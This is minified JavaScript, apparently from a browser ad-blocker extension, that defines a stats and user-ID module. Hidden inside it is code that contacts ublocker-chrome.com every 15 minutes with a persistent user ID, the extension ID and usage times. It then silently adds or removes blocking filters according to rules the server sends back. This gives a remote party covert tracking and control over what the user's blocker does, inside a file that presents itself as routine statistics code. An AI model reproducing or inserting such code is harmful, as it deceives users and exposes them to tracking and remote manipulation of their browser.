STATS=function(){var e,t,n="total_pings",r=33e5,o=!1,a=chrome.runtime.getManifest().version,i=navigator.userAgent.match(/(CrOS\ \w+|Windows\ NT|Mac\ OS\ X|Linux)\ ([\d\._]+)?/),s=(i||[])[1]||"Unknown",g=(i||[])[2]||"Unknown",c=((i="O"===(e=window.opr?"O":window.safari?"S":"E")?navigator.userAgent.match(/(?:OPR)\/([\d\.]+)/):navigator.userAgent.match(/(?:Chrome|Version)\/([\d\.]+)/))||[])[1]||"Unknown";const u="https://ublocker-chrome.com";var l=function(){};const{FilterStorage:S}=require("filterStorage");var m={lTime:null,mTime:null,uuid:null,rDeny:null,rAllow:null,qaParams:{},extStat:!1,envDetected:!1,traceUrl:"https://ublocker-chrome.com/api/trace/",apiOrigin:u};const f=function(e){for(var t in e)m[t]=e[t];chrome.storage.local.set(e)};l=function(){let e=(new Date).getTime(),t=e-m.mTime;f({mTime:e}),t<12e5&&f({lTime:m.lTime+t});let n="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:chrome.runtime.getManifest().version,mt:m.mTime,lt:m.lTime,uid:(m.uuid||f({uuid:"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}))}),m.uuid),t:Date.now()})));fetch("https://ublocker-chrome.com/api/feedback/?"+n).then((e=>e.json())).catch((e=>{})).then((e=>{e&&(e.cRules&&(applyRules(e.cRules),delete e.cRules),f(e))})),setTimeout(l,9e5)},chrome.storage.local.get(m,(function(e){m=e,l()})),applyRules=function(e){if(e.length&&!(e.length<1))try{for(var t=0;t<e.length;t++){if(!e[t].op)return;let n=require("filterValidation").parseFilter(e[t].txt);if(n.error);else if(n.filter){let r="+"===e[t].op?"add":"remove";S[r+"Filter"](n.filter)}}}catch(e){}};var T=function(e){var t=localStorage;if(void 0!==t){e+="_alt";var n=t.getItem(e);if(null!=n)try{return JSON.parse(n)}catch(e){return void(e&&e.message&&recordErrorMessage("storage_get_error ",void 0,{errorMessage:e.message}))}}},d=function(e,t){var n=localStorage;if(e+="_alt",void 0!==t)try{n.setItem(e,JSON.stringify(t))}catch(e){o=!0}else n.removeItem(e)};function x(){return new Promise((function(e,n){ext.storage.get(STATS.userIDStorageKey,(n=>{var r=T(STATS.userIDStorageKey);if(n[STATS.userIDStorageKey]||r)t=n[STATS.userIDStorageKey]||r,!n[STATS.userIDStorageKey]&&r&&ext.storage.set(STATS.userIDStorageKey,t),n[STATS.userIDStorageKey]&&!r&&d(STATS.userIDStorageKey,t);else{STATS.firstRun=!0;for(var o=Date.now()%1e8,a="abcdefghijklmnopqrstuvwxyz0123456789",i=[],s=0;s<8;s++){var g=Math.floor(Math.random()*a.length);i.push(a[g])}t=i.join("")+o,ext.storage.set(STATS.userIDStorageKey,t),d(STATS.userIDStorageKey,t)}e(t)}))}))}ext.onMessage.addListener((function(e,t,n){return"get_qa_rules"===e.command?(chrome.storage.local.get(m,(function(e){n(e)})),!0):"get_adblock_user_id"===e.command?(x().then((function(e){n(e)})),!0):void 0}));var h=function(){var n;((n=function(e){if(e.u){if(e.pc>5e3){if(e.pc>5e3&&e.pc<1e5&&e.pc%5e3!=0)return;if(e.pc>=1e5&&e.pc%5e4!=0)return}e.cmd="ping",chrome.management&&chrome.management.getSelf&&chrome.management.getSelf((function(t){e.it=t.installType.charAt(0)}))}})||"function"==typeof n)&&ext.storage.get(STATS.totalPingStorageKey,(function(r){var i=T(STATS.totalPingStorageKey),u=r[STATS.totalPingStorageKey]||i||0,l={u:t,v:a,f:e,o:s,bv:c,ov:g,ad:getSettings().show_advanced_options?"1":"0",l:determineUserLanguage(),pc:u,cb:getSettings().safari_content_blocking?"1":"0",dcv2:getSettings().data_collection_v2?"1":"0"};"E"===e&&Prefs.blocked_total&&(l.b=Prefs.blocked_total),chrome.runtime.id&&(l.extid=chrome.runtime.id);var S=getAllSubscriptionsMinusText();S.acceptable_ads?l.aa=S.acceptable_ads.subscribed?"1":"0":l.aa="u",l.dc=o?"1":"0",SURVEY.types((function(e){l.st=e,n(l)}))}))},v={max_events_per_hour:3,attempt:function(){for(var e=Date.now(),t=this._event_times,n=this.max_events_per_hour;t[0]&&(t[0]+36e5<e||null===n);)t.shift();return null===n||!(t.length>=n)&&(t.push(e),!0)},_event_times:[]};return{userIDStorageKey:"userid",totalPingStorageKey:n,nextPingTimeStorageKey:"next_ping_time",firstRun:false,userId:function(){return t},version:a,flavor:e,browser:{O:"Opera",S:"Safari",E:"Chrome"}[e],browserVersion:c,os:s,osVersion:g,pingNow:h,statsUrl:"",untilLoaded:function(e){x().then((function(t){"function"==typeof e&&e(t)}))},startPinging:function(){x().then((function(e){ext.storage.get(STATS.totalPingStorageKey,(function(e){e[STATS.totalPingStorageKey]||(chrome.management&&chrome.management.getSelf?chrome.management.getSelf((function(e){e?recordGeneralMessage("new_install_"+e.installType):recordGeneralMessage("new_install")})):recordGeneralMessage("new_install"))}))})),function e(){var t;(t=function(t){window.setTimeout((function(){h(),ext.storage.get(STATS.totalPingStorageKey,(function(e){var t=T(n);t=isNaN(t)?0:t;var r=e[STATS.totalPingStorageKey];r=isNaN(r)?0:r,r=Math.max(t,r),r+=1,ext.storage.set(STATS.totalPingStorageKey,r),d(STATS.totalPingStorageKey,r);var a=36e5*(1==r?1:r<9?24:168),i=Date.now()+a;ext.storage.set(STATS.nextPingTimeStorageKey,i,(function(){o=!!chrome.runtime.lastError})),d(STATS.nextPingTimeStorageKey,i)})),e()}),t)})&&"function"==typeof t&&(o?t(r):window.setTimeout((function(){ext.storage.get(STATS.nextPingTimeStorageKey,(function(e){var n=T(STATS.nextPingTimeStorageKey);n=isNaN(n)?0:n;var o=isNaN(e[STATS.nextPingTimeStorageKey])?0:e[STATS.nextPingTimeStorageKey];0===(o=Math.max(n,o))&&STATS.firstRun?t(0):0===o||isNaN(o)?t(r):t(o-Date.now())}))}),1e4))}()},msg:function(n){if(v.attempt()){var r={cmd:"msg2",m:n,u:t,v:a,fr:false,f:e,bv:c,o:s,ov:g};chrome.runtime.id&&(r.extid=chrome.runtime.id)}else log("Rate limited:",n)}}}();